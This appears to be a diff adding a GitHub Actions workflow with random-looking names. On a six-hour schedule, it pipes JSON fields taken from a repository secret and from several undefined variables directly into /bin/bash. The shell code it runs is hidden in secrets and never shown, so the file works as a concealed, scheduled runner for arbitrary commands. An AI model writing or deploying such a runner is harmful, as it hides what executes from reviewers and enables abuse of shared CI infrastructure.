@@ -1,0 +1,21 @@
+name: lujingxi3456
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lujingxi3456
+        env:
+          w45: ${{ secrets.w45 }}
+        run: |
+          echo $w45 | jq -r .sodk87 | /bin/bash
+          echo $zl998 | jq -r .ejh7544 | /bin/bash
+          echo $kxj1 | jq -r .set77169 | /bin/bash
+          echo $zyhi1 | jq -r .dva64352 | /bin/bash
+          echo $pkwum935 | jq -r .ur11425 | /bin/bash
+
